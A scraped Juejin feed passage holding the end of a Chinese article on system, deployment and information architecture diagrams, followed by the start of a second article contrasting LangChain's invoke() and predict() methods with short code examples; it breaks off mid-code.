<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11fa0b5a47c542b0a3f4980551ba43eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=UjG2lMfaZ2RWeMk3Owm2PlTQF%2Fg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-32">6. 系统架构图</h2>
<h3 data-id="heading-33">6.1. 什么事系统架构图</h3>
<p>系统架构关注的是系统的整体结构和组织方式，它描述了系统的<strong>各个组件、模块、子系统以及它们之间的交互和通信方式，更偏向于系统的物理构成和部署方式</strong>。一个电商平台的系统架构图可能包括负载均衡器、Web服务器、应用服务器、数据库服务器、缓存服务器等，以及它们之间的网络连接和数据传输。</p>
<p>应用架构是从整体上定义了应用程序的实现方式，系统架构则是从更加具体的层面对于应用程序怎样实现进行了设计，如果把应用架构类比为广东省的规划，那么系统架构就是深圳市的规划。</p>
<p>相比技术架构，系<strong>统架构是关于“做什么”和“怎么做”的高层次描述，而技术架构是关于“怎么做”的更详细的技术实现描述</strong>，如果把系统架构类比为深圳市的规划，那么技术架构就是南山区的规划。两者相辅相成，共同指导软件系统的设计和开发。</p>
<p>系统架构图不仅仅是一张图表，它是项目成功的蓝图。系统架构图作为一种可视化工具，能够帮助不同背景的团队成员理解复杂的系统结构，从而促进更有效的沟通。系统架构图通过展示系统的当前和未来状态，可以帮助团队做出更明智的技术选择和规划。当面对系统中的问题时，一张详细的系统架构图可以帮助快速定位问题源头，从而简化解决过程。</p>
<h3 data-id="heading-34">6.2. <strong>系统架构图常用元素</strong></h3>
<p>系统架构图常用元素有服务器、数据库、网络设备、子系统、接口等</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1789c0cc6e64c839ae8291b36cbf394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=d0c6M71uZyrAllvKtsRgGwuuro4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-35">6.3. 系统架构图组成</h3>
<p>1.<strong>系统元素</strong>：指系统中的各个组成部分，如模块、组件、接口等。<br/>
2.<strong>系统关系</strong>：指系统元素之间的关系和交互，如依赖关系、接口关系等。<br/>
3.<strong>系统属性</strong>：指系统元素和系统关系的一些特性，如性能、可靠性等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ac03f8c6184e59a982e9796408ede5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=f5MSOpo9ejlnHQyexabYk6YgU9E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-36">6.4. 系统架构图分类</h3>
<p>1.<strong>物理架构图</strong>：描述系统的物理组成和部署情况，如服务器、网络设备等。<br/>
2.<strong>逻辑架构图</strong>：描述系统的逻辑组成和功能模块，如业务模块、数据模块等。<br/>
3.<strong>流程架构图</strong>：描述系统的流程和业务流程，如数据流程、业务流程等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afea69f3ab304800b946fbef18bb23f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=2MOzGw6XwpeLhKots0l0vO0yq1E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-37">6.5. 系统架构图作用</h3>
<p><strong>为项目成员提供整体视角</strong>，确保系统设计合理且各部分协调</p>
<p><strong>支持架构决策和技术选型</strong>，明确各组件职责</p>
<p><strong>方便沟通和协作</strong>，减少误解和重复工作</p>
<p><strong>帮助运维和测试团队</strong>，更容易理解系统运行机制及风险点</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753de4d58afd4b3992e8c962e30a71aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=KIUZUfQPX6W3niDK%2BMSJHeU1c4U%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-38"/>
<h2 data-id="heading-39">7. 部署架构图</h2>
<p>部署架构图： <strong>关注系统如何被部署到物理机器和网络环境中</strong>，包括<strong>硬件、软件、网络设备等资源的配置和布局</strong>，为系统管理员和运维人员提供系统的部署方案，帮助他们理解系统的物理布局和部署要求。</p>
<h3 data-id="heading-40">7.1. 什么是部署架构图</h3>
<p>部署架构图又叫物理架构图，是描述系统组件及其相互关系的图形表示，关注软件元件是如何放到硬件上的，专注于基础设施，某种软硬件体系，甚至云平台，包括机房搭建、网络拓扑结构，网络分流器、代理服务器、Web 服务器、应用服务器、报表服务器、整合服务器、存储服务器和主机等。</p>
<p>物理架构主要考虑硬件选择和拓扑结构，软件到硬件的映射，软硬件的相互影响。在软件系统的开发和实施过程中，部署架构图扮演着非常重要的角色。通过清晰的部署架构图，能够为开发者提供完整的系统概览，帮助其理解系统组件的布局和交互方式。</p>
<h3 data-id="heading-41">7.2. 部署架构图元素</h3>
<p>部署架构图常用的元素包括：基础设施层元素、网络与通信元素、应用与服务层、用户与客户、图形符号和连线样式等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c31b84d225b44e66875a0610f70debec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=Q4bgOv2rAyfUEVSK%2Fe1fNipjXTE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-42">7.3. 部署架构图模块</h3>
<p><strong>接入层</strong>：用于接收外部请求，是系统的“入口”。</p>
<p><strong>服务层</strong>：实现具体业务逻辑，通常由多个服务或微服务组成。</p>
<p><strong>通信与集成层</strong>：模块之间或系统与第三方的交互机制。</p>
<p><strong>数据层</strong>：负责数据的持久化与管理。</p>
<p><strong>运维与监控层</strong>：保障系统稳定性和可观测性。</p>
<p><strong>部署与基础设施层</strong>：底层资源的部署方式与基础支撑。</p>
<p><strong>安全层</strong>：保障系统各个模块的访问控制和数据安全。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29d3e4a042fb4e56a59b17cf5aa4cfdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=HDQsVX%2BnX8dfvQqP24oe2bgnU5I%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-43">7.4. 部署架构图作用</h3>
<p>部署架构图能够帮助开发人员更好地理解系统的整体结构，以及各个组件之间的数据流动和交互方式。此外，通过部署架构图，开发人员可以更好地规划系统的部署和扩展策略，提高系统的可维护性和可扩展性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d18a587e2179466d9702811e06b7f17f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=9YEPzieA%2F%2FxrTdBN4SZaaQ26Rxo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-44">7.5. 部署架构图应用场景</h3>
<p><strong>开发协作</strong>：清晰知道各服务部署位置、依赖组件，避免部署误差</p>
<p><strong>运维部署</strong>：指导环境搭建、版本发布、容量评估、健康监控等</p>
<p><strong>安全评估</strong>：审查网络隔离、认证鉴权、端口暴露、流量控制等</p>
<p><strong>性能规划</strong>：分析瓶颈、做容量预估、支持弹性扩展方案</p>
<p><strong>灾备设计</strong>：展示主备结构、异地多活、自动故障切换机制</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21c775df1f15451e862ab011bc3c6251~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=9TWsNWk37WIOM9%2Fo6luBaaF%2Bu84%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-45">7.6. 部署架构图类型</h3>
<p><strong>单体部署</strong>：所有模块部署在同一台或少数几台机器上</p>
<p><strong>分布式部署</strong>：模块划分明确，服务部署在多个节点上</p>
<p><strong>微服务部署</strong>：基于容器或服务网格，各模块独立部署，可独立伸缩</p>
<p><strong>混合云部署</strong>：部分模块部署在本地 IDC，部分部署在云端</p>
<p><strong>多活部署</strong>：多个节点/区域同时提供服务，提高可用性与容灾能力</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fafd6998ae4b407c8b03b30f533abc3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=BxEoU3QJ7c1DRoDW3b%2BlD81a8rM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-46">8. 信息架构图</h2>
<h3 data-id="heading-47">8.1. 什么是信息架构图</h3>
<p>信息结构图就是将业务中的对象按照一定的方式梳理而成的结构化信息图谱，是帮助我们定义和组织如何在产品中展示信息的工具。信息架构图的设计旨在满足用户需求和产品目标，通过合理的信息组织和表达，使用户更容易获取和理解信息。</p>
<p>信息架构的核心是探讨用户对信息的认知过程，对于产品设计而言，信息架构关注的是“呈现给用户合理且有价值的信息”。</p>
<p>信息架构图通常由信息架构师和交互设计师共同设计，他们需要深入理解用户需求、业务目标和技术平台，以确保信息架构图能够有效地支持用户的信息检索和导航需求。</p>
<p>信息架构图一般以思维导图绘制居多，绘制方法和步骤也比较简单</p>
<h3 data-id="heading-48">8.2. <strong>信息架构图设计原则</strong></h3>
<p><strong>对应性</strong>：产品目标与用户需求相对应。</p>
<p><strong>功能的相似性</strong>：通过分类把相似性质的功能放在一起，以大类为基础作为产品的主框架，以小类作为子框架进行补充就形成了整个产品框架。</p>
<p><strong>功能和功能之间的关系</strong>：包含关系--功能之间存在上下游依赖的关系，可以纵向进行的信息架构；并列关系--两个功能之间没有关联，可以考虑横向信息架构。</p>
<p><strong>功能的使用频率</strong>：使用的频率越高，说明这个功能越重要，越要把这个功能放在最容易触及的地方，优先考虑围绕核心功能进行设计架构。</p>
<p><strong>系统的扩展性</strong>：产品从0到1，从1到N，产品功能也是不断增加完善的，这就要求在做信息架构时，要做好拓展的准备，考虑之后的扩展性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff5c4ef565294249a0c7a52062922fc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=jHHi0ye%2FHeJbRPBz0aNlpxoek5A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-49">8.3. 信息架构构建方式</h3>
<p><strong>自上而下</strong>：自上而下的构建方式是由战略层驱动，根据产品目标与用户需求直接进行结构设计，进行新产品规划或者产品重新定义的时候用到。</p>
<p><strong>自下而上</strong>：自下而上的构建方式是由范围层驱动，根据对现有的内容和功能需求的分析进行设计，这是项目实践中大家最常用的一种方式。</p>
<p><strong>综合运用</strong>：自上而下和自下而上两种构建方式都有明显的缺点，所以理想的信息架构的构建方式都是综合运用的，同时从战略层和范围层进行驱动，以构建一个适应性强的系统。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c8b23ed2794c4ea7f2b86beef5b27a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdXpvbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604797&amp;x-signature=8A5cwzjVD53zA4MH8877sO6uzcw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-50">9. 总结</h2>
<p>架构图在软件开发过程中的关键作用，它们不仅是设计文档的重要组成部分，也是确保项目成功的关键因素之一。通过合理的架构设计，可以有效提升系统的可维护性、扩展性和用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain / LLM 开发中：invoke() 与 predict() 的区别]]></title>    <link>https://juejin.cn/post/7576130618904985636</link>    <guid>https://juejin.cn/post/7576130618904985636</guid>    <pubDate>2025-11-24T17:17:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130618904985636" data-draft-id="7576223441687806015" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain / LLM 开发中：invoke() 与 predict() 的区别"/> <meta itemprop="keywords" content="LangChain,Python,LLM"/> <meta itemprop="datePublished" content="2025-11-24T17:17:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吴佳浩"/> <meta itemprop="url" content="https://juejin.cn/user/2696441245481975"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain / LLM 开发中：invoke() 与 predict() 的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2696441245481975/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吴佳浩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T17:17:48.000Z" title="Mon Nov 24 2025 17:17:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{font-family:-apple-system,system-ui,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial;color:#00325e}.markdown-body ::selection{background-color:#00325e;color:#fff}.markdown-body blockquote{padding:10px 20px;background-color:#fffaf0;box-shadow:0 3px 10px 0 rgba(255,172,194,.24);border:1px solid #f3ca8e;transition:all .2s;margin:1em 0;border-radius:5px}.markdown-body blockquote p{font-size:14px;line-height:25px;color:#795548}.markdown-body blockquote p:last-child{margin:0}.markdown-body blockquote:hover{border-color:#ff9800;background-color:#fff8e0;box-shadow:0 6px 10px -5px rgba(225,173,98,.3803921569)}.markdown-body blockquote code{color:#ff502c}.markdown-body pre{border:1px solid #8cc0f3;box-shadow:0 3px 10px 0 rgba(255,198,198,.28);border-radius:5px;transition:all .2s;overflow-x:auto;white-space:pre-wrap}.markdown-body pre:hover{border-color:#6d9dce}.markdown-body pre&gt;code{padding:10px 20px;color:#00325e;background:#f0f8ff;font-size:12px;line-height:1.6;display:block}.markdown-body code{background:#f6fbff;color:#0b5393;padding:2px 4px;border-radius:4px;font-size:12px}.markdown-body p{font-size:14px;line-height:28px;text-align:justify;margin-bottom:17px;color:#595959}.markdown-body a{color:#00325e;text-decoration:none}.markdown-body a:after{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAQdJREFUKFNt0DtLA0EUBeBzZle0Eks7rcUfEfBRCha7NorYa6NmVJzgyi4smUgKtdZGCJktLMVH4Y8QeztLWyE7VyLEuNFbXj4Oh0P8c8mZm+uJrEN4BJFTeP/MUVe3bnocfALwkOlo1zS7iZAzf6Cx7oXgbaqjxiDEWCcVaGyxQ8pSWo9XhqhoQ/xUFbaKjhe5V+CmR7mnSplEEF6GSmJ+F/d0KHvbCIIJCLc85U6BC5mONgbJNM3uFag++sX7z8O8MzsWBucifMx0dDGE1kmm458KDVukAlnNdDz/exEeW3dNkbfsYC0xtmgDWP6ELLZ0/F6BJu/UoFQN5AkoeUjeJPvx6+i+X5Sjah4tA6gYAAAAAElFTkSuQmCC);margin-left:2px}.markdown-body a:hover{box-shadow:0 1px}.markdown-body table{max-width:100%;border-collapse:collapse;border-spacing:0;box-shadow:0 3px 10px 0 rgba(255,238,172,.24);transition:all .2s}.markdown-body table:hover{box-shadow:0 3px 10px 0 rgba(185,169,103,.24)}.markdown-body table tr th{border:1px solid #8cc0f3;background-color:#f0f8ff;padding:12px 15px}.markdown-body table tr td{border:1px solid rgba(243,202,142,.4);padding:12px 15px}.markdown-body table tbody tr{transition:all .2s}.markdown-body table tbody tr:hover td{border-color:#f3ca8e;background-color:#fff8e0;z-index:1}.markdown-body img{max-width:100%}.markdown-body h1{font-size:20px;margin-top:30px;margin-bottom:10px;padding-left:30px;position:relative}.markdown-body h1&gt;code{font-size:20px}.markdown-body h1:before{content:"🍺";display:block;font-size:18px;width:18px;height:18px;left:0;position:absolute}.markdown-body h2{font-size:18px;margin-top:30px;margin-bottom:10px;padding-left:28px;position:relative}.markdown-body h2&gt;code{font-size:18px}.markdown-body h2:before{content:"🍻";display:block;font-size:16px;width:16px;height:16px;left:0;position:absolute}.markdown-body h3{font-size:16px;margin-top:30px;margin-bottom:10px;padding-left:26px;position:relative}.markdown-body h3&gt;code{font-size:16px}.markdown-body h3:before{content:"🥂";display:block;font-size:14px;width:14px;height:14px;left:0;position:absolute}.markdown-body h4{font-size:14px;margin-top:30px;margin-bottom:10px;padding-left:24px;position:relative}.markdown-body h4&gt;code{font-size:14px}.markdown-body h4:before{content:"🥃";display:block;font-size:12px;width:12px;height:12px;left:0;position:absolute}.markdown-body h5{font-size:12px;margin-top:30px;margin-bottom:10px}.markdown-body h5&gt;code{font-size:12px}.markdown-body h6{font-size:10px;margin-top:30px;margin-bottom:10px}.markdown-body h6&gt;code{font-size:10px}.markdown-body h1,.markdown-body h2{color:#ff502c}.markdown-body hr{height:4px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#6d9dce,#8cc0f3 25%,transparent 50%)}.markdown-body hr:nth-child(2n){background-image:linear-gradient(270deg,#ff9800,#fff8e0 25%,transparent 50%)}.markdown-body ul{padding-inline-start:20px}.markdown-body ul li{list-style-type:"🔸"}.markdown-body ul li li{list-style-type:"◻️"}.markdown-body ul li li li{list-style-type:"▫️"}.markdown-body ol{padding-inline-start:20px}.markdown-body ol ::marker{color:#ff9800}.markdown-body ol,.markdown-body ul{line-height:2em}.markdown-body li{padding-inline-start:1ch}.markdown-body li.task-list-item{list-style:none;padding-inline-start:0}.markdown-body li input{padding-right:2px}.markdown-body li input[type=checkbox i]{appearance:none}.markdown-body li input:before{content:"🟩";display:block;width:13px;height:13px}.markdown-body li input:checked:before{content:"✅"}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0"><strong>LangChain / LLM 开发中：invoke() 与 predict() 的区别</strong></h2>
<blockquote>
<p>文章当中的1400等等协议内容大家不必在意这是我日常会用到的   大家主要了解就可以了</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2a3016eef8c4ab0933e83e98f1dd875~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC05L2z5rWp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764609971&amp;x-signature=b7DmIdheEqoZ8Gl74AbKoDPlRtw%3D" alt="人工智能的无限可能.png" loading="lazy"/></p>
<p><strong>作者</strong>：吴佳浩</p>
<p><strong>最后更新</strong>：2025-11-25</p>
<p><strong>适用版本</strong>：LangChain v1.0+</p>
<h3 data-id="heading-1">1. 为什么会有 invoke() 和 predict() 两个方法？</h3>
<p>在 LangChain / LCEL / OpenAI ChatModel 开发中，你会看到同一个模型居然能同时调用：</p>
<pre><code class="hljs language-python" lang="python">llm.predict(...)
llm.invoke(...)
</code></pre>
<p>predict 与 invoke 功能差异巨大，会影响：</p>
<ul>
<li>Chain 输出</li>
<li>推理（reasoning）</li>
<li>工具调用（tool_calls）</li>
<li>多轮对话结构</li>
<li>Agent 是否正常运行</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. 一句话区别（核心记忆表）</h3>





























<table><thead><tr><th>方法</th><th>作用</th><th>返回类型</th><th>是否包含推理（reasoning）</th><th>是否支持工具调用</th><th>是否适用 Chain/Agent</th></tr></thead><tbody><tr><td><strong>predict()</strong></td><td>获取模型最终输出的文本</td><td><code>str</code></td><td>否</td><td>否</td><td>否</td></tr><tr><td><strong>invoke()</strong></td><td>执行完整一次模型/链/agent 调用</td><td><code>dict / Message / JSON</code></td><td>是</td><td>是</td><td>是</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">3. 形象理解：两种调用方式的差异</h3>
<h4 data-id="heading-4">3.1 predict() 工作流程（仅返回文本）</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[Input Prompt] --&gt; B[predict]
    B --&gt; C[LLM Output Text]
    C --&gt; D[Return str]
</code></pre>
<h4 data-id="heading-5">3.2 invoke() 工作流程（返回结构化对象）</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[Input Dict or Messages] --&gt; B[invoke]
    B --&gt; C[Run LLM or Chain or Agent]
    C --&gt; D{需要工具调用?}
    D --&gt;|是| E[Generate ToolCalls]
    D --&gt;|否| F[Generate Messages]
    E --&gt; G[Return Structured Object]
    F --&gt; G
    G --&gt; H[包含 reasoning + metadata]
</code></pre>
<hr/>
<h3 data-id="heading-6">4. 代码对比（最清晰的差异）</h3>
<h4 data-id="heading-7">4.1 predict() 示例（返回纯文本）</h4>
<pre><code class="hljs language-python" lang="python">text = llm.predict(<span class="hljs-string">"Explain GA/T 1400"</span>)
<span class="hljs-built_in">print</span>(text)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(text))  <span class="hljs-comment"># &lt;class 'str'&gt;</span>
</code></pre>
<p><strong>返回示例：</strong></p>
<pre><code class="hljs language-bash" lang="bash">GA/T 1400 is a video interface standard...
&lt;class <span class="hljs-string">'str'</span>&gt;
</code></pre>
<p><strong>返回类型：<code>str</code></strong></p>
<hr/>
<h4 data-id="heading-8">4.2 invoke() 示例（返回结构化对象）</h4>
<pre><code class="hljs language-python" lang="python">result = llm.invoke(<span class="hljs-string">"Explain GA/T 1400"</span>)
<span class="hljs-built_in">print</span>(result)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(result))  <span class="hljs-comment"># &lt;class 'langchain_core.messages.ai.AIMessage'&gt;</span>
</code></pre>
<p><strong>返回示例：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AIMessage"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"GA/T 1400 is a video interface standard..."</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_database"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"table"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"standards"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"query"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"GA/T 1400"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"call_abc123"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"finish_reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tool_calls"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"gpt-4"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"token_usage"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"prompt_tokens"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"completion_tokens"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">120</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"run-xyz789"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>返回类型：<code>AIMessage</code> / <code>dict</code> / <code>JSON</code></strong></p>
<hr/>
<h3 data-id="heading-9">5. 为什么实际项目必须使用 invoke()？</h3>
<p>predict() 只输出一段文本，信息量不够。</p>
<p>而 invoke() 可以返回：</p>
<ul>
<li><strong>JSON 结构化数据</strong></li>
<li><strong>多轮 messages 完整历史</strong></li>
<li><strong>tool_calls 工具调用记录</strong></li>
<li><strong>推理链（reasoning）中间步骤</strong></li>
<li><strong>metadata 元数据（token使用、模型版本等）</strong></li>
<li><strong>Chain / Agent 的完整输出结构</strong></li>
</ul>
<hr/>
<h3 data-id="heading-10">6. 实战案例：GA/T 1400 协议解析对比</h3>
<h4 data-id="heading-11">6.1 使用 predict() - 信息丢失❌</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI

